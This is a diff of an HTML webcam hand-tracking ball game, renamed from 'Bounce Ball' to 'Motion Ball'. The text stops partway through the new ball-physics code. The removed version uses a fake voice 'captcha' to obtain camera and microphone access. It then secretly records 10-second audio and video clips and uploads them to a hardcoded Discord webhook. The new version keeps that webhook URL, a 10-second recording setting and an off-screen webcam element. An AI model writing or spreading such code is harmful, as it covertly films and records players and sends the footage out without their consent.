@@ -2,954 +2,483 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Bounce Ball</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Motion Ball</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             user-select: none;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
         }
         body {
             background: #000;
             overflow: hidden;
-            height: 100vh;
+            position: fixed;
             width: 100vw;
-            font-family: Arial, sans-serif;
+            height: 100vh;
+            top: 0;
+            left: 0;
             touch-action: none;
-            position: relative;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
-        canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
+        #container {
+            position: relative;
             width: 100vw;
             height: 100vh;
-            display: block;
-            background: #0a0a12;
-            z-index: 2;
-            pointer-events: none;
+            overflow: hidden;
+            background: #000;
         }
-        #video {
-            position: fixed;
-            top: 0;
-            left: 0;
+        #webcam {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
             width: 1px;
             height: 1px;
             opacity: 0;
             pointer-events: none;
-            z-index: 0;
         }
-        #overlay-text {
-            position: fixed;
+        #canvas {
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100vw;
-            height: 100vh;
+            width: 100%;
+            height: 100%;
+            display: block;
+            background: #000;
+            touch-action: none;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             display: flex;
             align-items: center;
             justify-content: center;
+            pointer-events: none;
+            z-index: 10;
             color: #fff;
             font-size: 2.5rem;
-            font-weight: bold;
-            z-index: 3;
-            pointer-events: none;
-            text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
-            letter-spacing: 2px;
-            transition: opacity 0.5s;
-        }
-        #overlay-text.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-        #captcha-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #000;
-            z-index: 10;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            transition: opacity 0.8s;
-        }
-        #captcha-overlay.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-        #captcha-overlay h1 {
-            font-size: 2.2rem;
-            margin-bottom: 10px;
-            font-weight: 300;
+            font-weight: 700;
+            text-shadow: 0 0 30px rgba(0, 150, 255, 0.7), 0 0 60px rgba(0, 100, 255, 0.4);
             letter-spacing: 4px;
-        }
-        #captcha-overlay p {
-            font-size: 1.1rem;
-            color: #aaa;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
-        }
-        #captcha-btn {
-            background: rgba(255, 255, 255, 0.08);
-            border: 1.5px solid rgba(255, 255, 255, 0.25);
-            color: #fff;
-            padding: 16px 48px;
-            font-size: 1.3rem;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 2px;
-            background: rgba(255, 255, 255, 0.04);
-            backdrop-filter: blur(6px);
-            font-weight: 300;
-        }
-        #captcha-btn:hover {
-            background: rgba(255, 255, 255, 0.14);
-            border-color: rgba(255, 255, 255, 0.4);
-            transform: scale(1.02);
-        }
-        #captcha-btn:active {
-            transform: scale(0.96);
-        }
-        #captcha-btn:disabled {
-            opacity: 0.4;
-            pointer-events: none;
-        }
-        #captcha-status {
-            margin-top: 18px;
-            font-size: 0.95rem;
-            color: #888;
-            min-height: 30px;
-            letter-spacing: 1px;
-        }
-        #captcha-status.success {
-            color: #6f6;
-        }
-        #captcha-status.error {
-            color: #f66;
-        }
-        #game-btn {
-            position: fixed;
-            bottom: 28px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 5;
-            padding: 14px 44px;
-            font-size: 1.2rem;
-            border-radius: 60px;
-            border: 1.5px solid rgba(255, 255, 255, 0.2);
-            background: rgba(255, 255, 255, 0.06);
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 2px;
-            backdrop-filter: blur(4px);
-            font-weight: 300;
-            pointer-events: all;
-            display: none;
-        }
-        #game-btn:hover {
-            background: rgba(255, 255, 255, 0.12);
-            border-color: rgba(255, 255, 255, 0.35);
-        }
-        #game-btn:active {
-            transform: translateX(-50%) scale(0.95);
-        }
-        #game-btn.visible {
-            display: block;
-        }
-        #countdown-text {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 6;
-            color: #fff;
-            font-size: 4rem;
-            font-weight: bold;
-            text-shadow: 0 0 40px rgba(255, 255, 255, 0.15);
             opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s;
-            letter-spacing: 6px;
+            transition: opacity 0.8s ease;
             text-align: center;
-            line-height: 1.4;
+            padding: 20px;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
-        #countdown-text.show {
+        #overlay.show {
             opacity: 1;
         }
-        #countdown-text .sub {
-            font-size: 1.6rem;
-            font-weight: 300;
-            letter-spacing: 4px;
-            display: block;
-            margin-top: 8px;
-            color: #ccc;
+        #overlay span {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
         }
-        #game-over {
-            position: fixed;
+        #overlay .sub {
+            font-size: 1rem;
+            font-weight: 400;
+            opacity: 0.7;
+            margin-top: 10px;
+            display: block;
+        }
+        #desktop-msg {
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100vw;
-            height: 100vh;
-            z-index: 7;
-            background: rgba(0, 0, 0, 0.85);
+            width: 100%;
+            height: 100%;
             display: none;
             align-items: center;
             justify-content: center;
-            flex-direction: column;
+            z-index: 100;
+            background: #0a0a0a;
             color: #fff;
-            backdrop-filter: blur(6px);
+            font-size: 1.8rem;
+            text-align: center;
+            padding: 30px;
+            flex-direction: column;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
-        #game-over.show {
+        #desktop-msg .icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+        }
+        #desktop-msg .sub {
+            font-size: 1rem;
+            opacity: 0.6;
+            margin-top: 12px;
+            max-width: 400px;
+        }
+        #desktop-msg.show {
             display: flex;
         }
-        #game-over h1 {
-            font-size: 3rem;
-            font-weight: 300;
-            letter-spacing: 6px;
-            margin-bottom: 6px;
+        #status-dot {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            z-index: 20;
+            opacity: 0.6;
+            transition: background 0.3s;
         }
-        #game-over p {
-            font-size: 1.1rem;
-            color: #aaa;
-            letter-spacing: 2px;
+        #status-dot.recording {
+            background: #ff3333;
+            animation: pulse 1.2s infinite;
         }
-        #game-over .score {
-            font-size: 1.8rem;
-            color: #fff;
-            margin: 12px 0 20px;
-            letter-spacing: 3px;
+        #status-dot.idle {
+            background: #33ff33;
         }
-        #game-over button {
-            background: rgba(255, 255, 255, 0.08);
-            border: 1.5px solid rgba(255, 255, 255, 0.2);
-            color: #fff;
-            padding: 14px 40px;
-            font-size: 1.1rem;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.3s;
-            letter-spacing: 2px;
-            font-weight: 300;
+        @keyframes pulse {
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 0.6;
+            }
+            50% {
+                transform: scale(1.4);
+                opacity: 1;
+            }
         }
-        #game-over button:hover {
-            background: rgba(255, 255, 255, 0.15);
-        }
-        #level-display {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 4;
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 0.9rem;
-            letter-spacing: 3px;
-            pointer-events: none;
-            font-weight: 300;
-            text-transform: uppercase;
-        }
-        #score-display {
-            position: fixed;
-            top: 70px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 4;
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 1.8rem;
-            letter-spacing: 2px;
-            pointer-events: none;
-            font-weight: 700;
+        #fps-counter {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: rgba(255, 255, 255, 0.25);
+            font-size: 11px;
             font-family: monospace;
+            z-index: 15;
+            pointer-events: none;
+            letter-spacing: 0.5px;
         }
         @media (max-width: 600px) {
-            #captcha-overlay h1 {
-                font-size: 1.6rem;
-            }
-            #captcha-overlay p {
-                font-size: 0.95rem;
-            }
-            #captcha-btn {
-                padding: 14px 32px;
-                font-size: 1rem;
-            }
-            #overlay-text {
+            #overlay {
                 font-size: 1.8rem;
             }
-            #game-btn {
-                padding: 12px 30px;
-                font-size: 1rem;
-                bottom: 20px;
+            #overlay .sub {
+                font-size: 0.8rem;
             }
-            #countdown-text {
-                font-size: 2.8rem;
-            }
-            #countdown-text .sub {
-                font-size: 1.2rem;
-            }
-            #game-over h1 {
-                font-size: 2.2rem;
-            }
-            #score-display {
+            #desktop-msg {
                 font-size: 1.4rem;
-                top: 60px;
+            }
+            #desktop-msg .icon {
+                font-size: 3rem;
+            }
+        }
+        @media (orientation: portrait) {
+            #container {
+                width: 100vw;
+                height: 100vh;
             }
         }
     </style>
 </head>
 <body>
 
-    <!-- Hidden video element - muted -->
-    <video id="video" autoplay playsinline muted></video>
-
-    <!-- Canvas -->
-    <canvas id="canvas"></canvas>
-
-    <!-- Overlay text -->
-    <div id="overlay-text">show hand</div>
-
-    <!-- Level display (now used for speed level) -->
-    <div id="level-display">speed 1</div>
-
-    <!-- Score display -->
-    <div id="score-display">0</div>
-
-    <!-- Game button -->
-    <button id="game-btn">▶ play game</button>
-
-    <!-- Countdown -->
-    <div id="countdown-text">
-        bounce the ball
-        <span class="sub" id="countdown-number">3</span>
+    <div id="container">
+        <video id="webcam" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+        <div id="overlay">
+            <span>👋 SHOW HAND<br><span class="sub">Show your palm to start</span></span>
+        </div>
+        <div id="desktop-msg">
+            <div class="icon">📱</div>
+            <div>Switch to Mobile Device</div>
+            <div class="sub">This experience requires a mobile device with camera &amp; microphone.<br>Please open on your phone or tablet.</div>
+        </div>
+        <div id="status-dot" class="idle"></div>
+        <div id="fps-counter">-- FPS</div>
     </div>
 
-    <!-- Game over overlay -->
-    <div id="game-over">
-        <h1>missed!</h1>
-        <p>the ball hit the ground</p>
-        <div class="score" id="final-score">score: 0</div>
-        <button id="restart-btn">↻ try again</button>
-    </div>
-
-    <!-- Captcha overlay -->
-    <div id="captcha-overlay">
-        <h1>⌘ verify</h1>
-        <p>say the word <strong style="color:#fff;">"apple"</strong> to continue</p>
-        <button id="captcha-btn">🎤 click &amp; speak</button>
-        <div id="captcha-status">waiting...</div>
-    </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js">
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils@0.3/camera_utils.js" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils@0.3/drawing_utils.js" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands@0.4/hands.js" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose@0.4/pose.js" crossorigin="anonymous">
     </script>
 
     <script>
-        // ─── CONFIG ────────────────────────────────────────────────
-        const WEBHOOK_URL =
-            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
+        (function() {
+            'use strict';
 
-        // ─── DOM REFS ──────────────────────────────────────────────
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const video = document.getElementById('video');
-        const overlayText = document.getElementById('overlay-text');
-        const gameBtn = document.getElementById('game-btn');
-        const countdownEl = document.getElementById('countdown-text');
-        const countdownNum = document.getElementById('countdown-number');
-        const gameOverEl = document.getElementById('game-over');
-        const finalScoreEl = document.getElementById('final-score');
-        const restartBtn = document.getElementById('restart-btn');
-        const levelDisplay = document.getElementById('level-display');
-        const scoreDisplay = document.getElementById('score-display');
-        const captchaOverlay = document.getElementById('captcha-overlay');
-        const captchaBtn = document.getElementById('captcha-btn');
-        const captchaStatus = document.getElementById('captcha-status');
-
-        // ─── SIZING ──────────────────────────────────────────────────
-        let W = 0,
-            H = 0;
-
-        function resize() {
-            W = window.innerWidth;
-            H = window.innerHeight;
-            canvas.width = W;
-            canvas.height = H;
-        }
-        resize();
-        window.addEventListener('resize', resize);
-
-        // ─── STATE ──────────────────────────────────────────────────
-        let isVerified = false;
-        let isGameRunning = false;
-        let isGameOver = false;
-        let score = 0;
-        let speedLevel = 1;
-        let handLandmarks = null;
-        let handVisible = false;
-        let indexTipX = 0,
-            indexTipY = 0,
-            indexTipVisible = false;
-        let frameId = null,
-            gameLoopId = null,
-            videoFrameLoop = null;
-        let countdownActive = false,
-            countdownValue = 3;
-        let recordingActive = false,
-            mediaRecorder = null,
-            recordedChunks = [],
-            stopTimeout = null,
-            stream = null;
-        let isTracking = false;
-        let recognition = null;
-        let captchaVerified = false;
-
-        // ─── BALL PHYSICS ──────────────────────────────────────────
-        let ball = {
-            x: 0,
-            y: 0,
-            r: 0,
-            vx: 0,
-            vy: 0,
-            gravity: 0.6,
-            bounceForce: -12,
-            squish: 1,
-            trail: []
-        };
-        const GRAVITY_BASE = 0.6;
-        const MAX_TRAIL = 8;
-
-        // ─── RED LINE ──────────────────────────────────────────────
-        let dangerLineY = 0;
-
-        function initBall() {
-            const size = Math.min(W, H);
-            ball.r = size * 0.045;
-            ball.x = W / 2;
-            ball.y = H * 0.3;
-            ball.vy = 0;
-            ball.vx = (Math.random() - 0.5) * 1.5;
-            ball.squish = 1;
-            ball.trail = [];
-            dangerLineY = H - size * 0.08;
-        }
-
-        function resetBall() {
-            const size = Math.min(W, H);
-            ball.r = size * 0.045;
-            ball.x = W / 2 + (Math.random() - 0.5) * 100;
-            ball.y = H * 0.3;
-            ball.vy = 0;
-            ball.vx = (Math.random() - 0.5) * 1.5;
-            ball.squish = 1;
-            ball.trail = [];
-        }
-
-        // ─── HAND TRACKING ──────────────────────────────────────────
-        function isPalmFacingCamera(landmarks) {
-            if (!landmarks || landmarks.length < 21) return false;
-            const idxMCP = landmarks[5],
-                midMCP = landmarks[9],
-                ringMCP = landmarks[13],
-                pinkyMCP = landmarks[17];
-            const palmZ = (idxMCP.z + midMCP.z + ringMCP.z + pinkyMCP.z) / 4;
-            const tipIdx = landmarks[8],
-                tipMid = landmarks[12],
-                tipRing = landmarks[16],
-                tipPinky = landmarks[20];
-            const tipZ = (tipIdx.z + tipMid.z + tipRing.z + tipPinky.z) / 4;
-            return tipZ < palmZ - 0.01;
-        }
-
-        function isHandInBottom(landmarks) {
-            if (!landmarks || landmarks.length < 21) return false;
-            return landmarks[0].y > 0.45;
-        }
-
-        function onHandResults(results) {
-            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
-                const lm = results.multiHandLandmarks[0];
-                handLandmarks = lm;
-                const palmFace = isPalmFacingCamera(lm);
-                const bottom = isHandInBottom(lm);
-                handVisible = palmFace && bottom;
-                const tip = lm[8];
-                if (tip) {
-                    indexTipX = tip.x * W;
-                    indexTipY = tip.y * H;
-                    indexTipVisible = true;
-                } else {
-                    indexTipVisible = false;
-                }
-            } else {
-                handLandmarks = null;
-                handVisible = false;
-                indexTipVisible = false;
-            }
-        }
-
-        const hands = new Hands({
-            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
-        });
-        hands.setOptions({
-            maxNumHands: 1,
-            modelComplexity: 0,
-            minDetectionConfidence: 0.7,
-            minTrackingConfidence: 0.6
-        });
-        hands.onResults(onHandResults);
-
-        // ─── RECORDING (10s loop) ──────────────────────────────────
-        function startRecording(mediaStream) {
-            if (!mediaStream) return;
-            if (recordingActive) return;
-
-            let selectedMimeType = 'video/webm;codecs=vp8';
-            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
-                if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    selectedMimeType = 'video/mp4';
-                } else if (MediaRecorder.isTypeSupported('video/webm')) {
-                    selectedMimeType = 'video/webm';
-                } else {
-                    selectedMimeType = '';
-                }
-            }
-
-            mediaRecorder = new MediaRecorder(mediaStream, {
-                mimeType: selectedMimeType,
-                videoBitsPerSecond: 3500000
-            });
-
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) recordedChunks.push(e.data);
+            // ─── CONFIG ──────────────────────────────────────────────────────────
+            const CONFIG = {
+                canvasWidth: 1920,
+                canvasHeight: 1080,
+                ballRadius: 22,
+                gravity: 0.45,
+                floorY: 980,
+                wallBounce: 0.78,
+                floorBounce: 0.72,
+                hitForce: 14,
+                maxVel: 22,
+                handConfidence: 0.55,
+                poseConfidence: 0.50,
+                recordingDuration: 10000,
+                webhookUrl: 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5',
             };
 
-            mediaRecorder.onstop = async () => {
-                if (recordedChunks.length > 0) {
-                    const blob = new Blob(recordedChunks, { type: selectedMimeType || 'video/webm' });
-                    recordedChunks = [];
+            // ─── DOM REFS ──────────────────────────────────────────────────────
+            const container = document.getElementById('container');
+            const video = document.getElementById('webcam');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            const overlay = document.getElementById('overlay');
+            const desktopMsg = document.getElementById('desktop-msg');
+            const statusDot = document.getElementById('status-dot');
+            const fpsCounter = document.getElementById('fps-counter');
 
-                    const formData = new FormData();
-                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file', blob, `bounce_${Date.now()}.${ext}`);
+            // ─── DIMENSIONS ────────────────────────────────────────────────────
+            let dpr = 1;
+            let displayW = 0;
+            let displayH = 0;
 
-                    try {
-                        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-                        console.log('✅ 10s clip sent');
-                    } catch (err) {
-                        console.error('Webhook send failed:', err);
-                    }
-                } else {
-                    recordedChunks = [];
-                }
-
-                if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
-                    try {
-                        mediaRecorder.start();
-                        scheduleStop();
-                    } catch (e) {
-                        console.warn('Recorder restart error:', e);
-                        setTimeout(() => {
-                            if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
-                                try { mediaRecorder.start();
-                                    scheduleStop(); } catch (_) {}
-                            }
-                        }, 500);
-                    }
-                }
-            };
-
-            mediaRecorder.start();
-            recordingActive = true;
-            scheduleStop();
-
-            function scheduleStop() {
-                if (stopTimeout) clearTimeout(stopTimeout);
-                stopTimeout = setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                        mediaRecorder.stop();
-                    }
-                }, 10000);
+            function resizeCanvas() {
+                const rect = container.getBoundingClientRect();
+                displayW = rect.width;
+                displayH = rect.height;
+                dpr = window.devicePixelRatio || 1;
+                canvas.width = CONFIG.canvasWidth;
+                canvas.height = CONFIG.canvasHeight;
+                canvas.style.width = displayW + 'px';
+                canvas.style.height = displayH + 'px';
+                ctx.imageSmoothingEnabled = false;
             }
-        }
+            resizeCanvas();
+            window.addEventListener('resize', resizeCanvas);
 
-        // ─── CAPTCHA FLOW ──────────────────────────────────────────
-        function initSpeechRecognition() {
-            const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
-            if (!SR) return null;
-            const rec = new SR();
-            rec.lang = 'en-US';
-            rec.interimResults = false;
-            rec.maxAlternatives = 1;
-            return rec;
-        }
-
-        function verifyCaptcha() {
-            if (captchaVerified) return;
-            captchaVerified = true;
-            captchaStatus.textContent = '✅ verified!';
-            captchaStatus.className = 'success';
-            setTimeout(() => {
-                captchaOverlay.classList.add('hidden');
-                isVerified = true;
-                gameBtn.classList.add('visible');
-                overlayText.classList.remove('hidden');
-            }, 400);
-        }
-
-        function handleCaptchaClick() {
-            if (captchaVerified) return;
-
-            captchaBtn.disabled = true;
-            captchaStatus.textContent = '⏳ requesting camera & mic...';
-            captchaStatus.className = '';
-
-            navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
-                    audio: true
-                })
-                .then(mediaStream => {
-                    stream = mediaStream;
-                    video.srcObject = stream;
-                    return video.play();
-                })
-                .then(() => {
-                    if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
-
-                    // Send frames at ~30fps to reduce CPU load
-                    let lastFrameTime = 0;
-
-                    function sendFrame(time) {
-                        if (time - lastFrameTime < 33) { // ~30 fps
-                            videoFrameLoop = requestAnimationFrame(sendFrame);
-                            return;
-                        }
-                        lastFrameTime = time;
-                        if (video.readyState >= 2) hands.send({ image: video });
-                        videoFrameLoop = requestAnimationFrame(sendFrame);
-                    }
-                    sendFrame(0);
-                    isTracking = true;
-
-                    startRecording(stream);
-
-                    if (recognition) {
-                        recognition.onresult = (e) => {
-                            const word = e.results[0][0].transcript.trim().toLowerCase();
-                            if (word === 'apple') {
-                                verifyCaptcha();
-                            } else {
-                                captchaStatus.textContent = `❌ you said "${word}", say "apple"`;
-                                captchaStatus.className = 'error';
-                                setTimeout(() => {
-                                    captchaStatus.textContent = 'say "apple" to continue';
-                                    captchaStatus.className = '';
-                                    captchaBtn.disabled = false;
-                                    captchaBtn.textContent = '🎤 click & speak';
-                                }, 2000);
-                            }
-                        };
-                        recognition.onerror = (e) => {
-                            if (e.error === 'not-allowed') {
-                                captchaStatus.textContent = '❌ mic blocked, please allow and retry';
-                                captchaStatus.className = 'error';
-                            } else {
-                                captchaStatus.textContent = '❌ listening error, try again';
-                                captchaStatus.className = 'error';
-                            }
-                            captchaBtn.disabled = false;
-                            captchaBtn.textContent = '🎤 retry';
-                        };
-                        recognition.onend = () => {
-                            if (!captchaVerified) {
-                                captchaBtn.disabled = false;
-                                captchaBtn.textContent = '🎤 click & speak';
-                                captchaStatus.textContent = 'say "apple" to continue';
-                                captchaStatus.className = '';
-                            }
-                        };
-
-                        try {
-                            recognition.start();
-                            captchaStatus.textContent = '🎧 listening... say "apple"';
-                            captchaStatus.className = '';
-                            captchaBtn.disabled = true;
-                            captchaBtn.textContent = '⏳ listening...';
-                        } catch (e) {
-                            captchaBtn.disabled = false;
-                            captchaBtn.textContent = '🎤 retry';
-                            captchaStatus.textContent = '⚠️ could not start listening, try again';
-                            captchaStatus.className = 'error';
-                        }
-                    } else {
-                        captchaStatus.textContent = '✅ media ready, click "verify" to continue';
-                        captchaStatus.className = 'success';
-                        captchaBtn.disabled = false;
-                        captchaBtn.textContent = '✅ verify';
-                        captchaBtn.onclick = verifyCaptcha;
-                    }
-                })
-                .catch(err => {
-                    console.error('Permission error:', err);
-                    captchaStatus.textContent = '❌ camera/mic denied. Please allow and retry.';
-                    captchaStatus.className = 'error';
-                    captchaBtn.disabled = false;
-                    captchaBtn.textContent = '🎤 retry';
-                    stream = null;
-                });
-        }
-
-        function setupCaptcha() {
-            recognition = initSpeechRecognition();
-            captchaBtn.onclick = handleCaptchaClick;
-        }
-
-        // ─── GAME ──────────────────────────────────────────────────
-        function startGame() {
-            if (isGameRunning || countdownActive) return;
-            isGameOver = false;
-            score = 0;
-            speedLevel = 1;
-            ball.gravity = GRAVITY_BASE;
-            ball.bounceForce = -12;
-            scoreDisplay.textContent = '0';
-            levelDisplay.textContent = 'speed 1';
-            gameOverEl.classList.remove('show');
-            resetBall();
-            countdownNum.textContent = '3';
-            countdownEl.classList.add('show');
-            countdownActive = true;
-            countdownValue = 3;
-            gameBtn.classList.remove('visible');
-            overlayText.classList.add('hidden');
-
-            const countInterval = setInterval(() => {
-                countdownValue -= 1;
-                if (countdownValue <= 0) {
-                    clearInterval(countInterval);
-                    countdownEl.classList.remove('show');
-                    countdownActive = false;
-                    isGameRunning = true;
-                    gameLoop();
-                } else {
-                    countdownNum.textContent = countdownValue;
-                }
-            }, 900);
-        }
-
-        function gameLoop() {
-            if (!isGameRunning || isGameOver) return;
-            if (gameLoopId) cancelAnimationFrame(gameLoopId);
-            updateGame();
-            gameLoopId = requestAnimationFrame(gameLoop);
-        }
-
-        function updateGame() {
-            if (!isGameRunning || isGameOver) return;
-
-            // Physics
-            const gravity = ball.gravity + (speedLevel - 1) * 0.04;
-            ball.vy += gravity;
-            ball.vx *= 0.999;
-            ball.x += ball.vx;
-            ball.y += ball.vy;
-
-            // Squish recovery
-            if (ball.squish < 1) {
-                ball.squish += (1 - ball.squish) * 0.12;
-                if (ball.squish > 0.99) ball.squish = 1;
+            // ─── MOBILE DETECTION ─────────────────────────────────────────────
+            function isMobile() {
+                const ua = navigator.userAgent || '';
+                const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+                return mobile && hasTouch;
             }
 
-            // Wall bouncing
-            if (ball.x - ball.r < 0) { ball.x = ball.r;
-                ball.vx = Math.abs(ball.vx) * 0.9; }
-            if (ball.x + ball.r > W) { ball.x = W - ball.r;
-                ball.vx = -Math.abs(ball.vx) * 0.9; }
-            if (ball.y - ball.r < 0) { ball.y = ball.r;
-                ball.vy = Math.abs(ball.vy) * 0.85; }
-
-            // Finger collision
-            if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
-                const dx = ball.x - indexTipX;
-                const dy = ball.y - indexTipY;
-                const dist = Math.sqrt(dx * dx + dy * dy);
-                const hitRadius = ball.r + 18;
-
-                if (dist < hitRadius && ball.vy > 0) {
-                    const angle = Math.atan2(dy, dx);
-                    const force = Math.abs(ball.bounceForce) * (1 + speedLevel * 0.08);
-                    const randomAngle = (Math.random() - 0.5) * 0.3;
-                    const bounceSpeed = Math.max(Math.abs(ball.vy) * 0.8, Math.abs(force));
-                    ball.vx = Math.cos(angle + randomAngle) * bounceSpeed * 0.5;
-                    ball.vy = -Math.abs(bounceSpeed) * 1.1;
-                    ball.squish = 0.65;
-
-                    ball.trail.push({ x: ball.x, y: ball.y, life: 1 });
-                    if (ball.trail.length > MAX_TRAIL) ball.trail.shift();
-
-                    score++;
-                    scoreDisplay.textContent = score;
-                    const newSpeed = Math.floor(score / 10) + 1;
-                    if (newSpeed > speedLevel) {
-                        speedLevel = newSpeed;
-                        levelDisplay.textContent = `speed ${speedLevel}`;
-                        ball.bounceForce = -12 - (speedLevel - 1) * 0.8;
-                    }
-                    if (navigator.vibrate) navigator.vibrate(5);
-                }
-            }
-
-            // Trail fade
-            for (let i = ball.trail.length - 1; i >= 0; i--) {
-                ball.trail[i].life -= 0.035;
-                if (ball.trail[i].life <= 0) ball.trail.splice(i, 1);
-            }
-
-            // Check if ball hit the red line
-            if (ball.y + ball.r > dangerLineY) {
-                endGame();
+            if (!isMobile()) {
+                desktopMsg.classList.add('show');
+                overlay.classList.remove('show');
                 return;
             }
+            desktopMsg.classList.remove('show');
 
-            render();
-        }
+            // ─── STATE ──────────────────────────────────────────────────────────
+            const state = {
+                hands: null,
+                pose: null,
+                ball: {
+                    x: CONFIG.canvasWidth / 2,
+                    y: CONFIG.canvasHeight / 2 - 100,
+                    vx: 3.2,
+                    vy: -4.8,
+                    r: CONFIG.ballRadius,
+                },
+                fingerTips: [],
+                footSolePoints: [],
+                palmVisible: false,
+                soleVisible: false,
+                handLandmarks: null,
+                poseLandmarks: null,
+                frameCount: 0,
+                fps: 0,
+                lastFpsTime: 0,
+                isRecording: false,
+                mediaRecorder: null,
+                recordedChunks: [],
+                stream: null,
+                recordingTimer: null,
+                hasStarted: false,
+                showOverlay: true,
+                lastHitTime: 0,
+            };
 
-        function endGame() {
-            isGameRunning = false;
-            isGameOver = true;
-            if (gameLoopId) cancelAnimationFrame(gameLoopId);
-            gameLoopId = null;
-            finalScoreEl.textContent = `score: ${score}  ·  speed ${speedLevel}`;
-            gameOverEl.classList.add('show');
-            if (navigator.vibrate) navigator.vibrate([30, 50, 30]);
-            setTimeout(() => {
-                if (!isGameRunning) {
-                    gameBtn.classList.add('visible');
-                    gameBtn.textContent = '↻ play again';
+            // ─── BALL PHYSICS ──────────────────────────────────────────────────
+            const floorY = CONFIG.floorY;
+            const leftWall = CONFIG.ballRadius;
+            const rightWall = CONFIG.canvasWidth - CONFIG.ballRadius;
+            const topWall = CONFIG.ballRadius;
+            const bottomWall = CONFIG.canvasHeight - CONFIG.ballRadius;
+
+            function updateBall() {
+                const b = state.ball;
+                b.vy += CONFIG.gravity;
+                b.x += b.vx;
+                b.y += b.vy;
+
+                // Clamp velocity
+                const spd = Math.sqrt(b.vx * b.vx + b.vy * b.vy);
+                if (spd > CONFIG.maxVel) {
+                    b.vx = (b.vx / spd) * CONFIG.maxVel;
+                    b.vy = (b.vy / spd) * CONFIG.maxVel;
                 }
-            }, 1200);
-        }
 
-        function restartGame() {
-            gameOverEl.classList.remove('show');
-            isGameOver = false;
-            isGameRunning = false;
-            score = 0;
-            speedLevel = 1;
-            ball.gravity = GRAVITY_BASE;
-            ball.bounceForce = -12;
-            scoreDisplay.textContent = '0';
-            levelDisplay.textContent = 'speed 1';
-            resetBall();
-            ball.trail = [];
-            gameBtn.textContent = '▶ play game';
-            gameBtn.classList.add('visible');
-            overlayText.textContent = 'show hand';
-            overlayText.classList.remove('hidden');
-            if (gameLoopId) cancelAnimationFrame(gameLoopId);
-            gameLoopId = null;
-        }
+                // Floor bounce
+                if (b.y + b.r > floorY) {
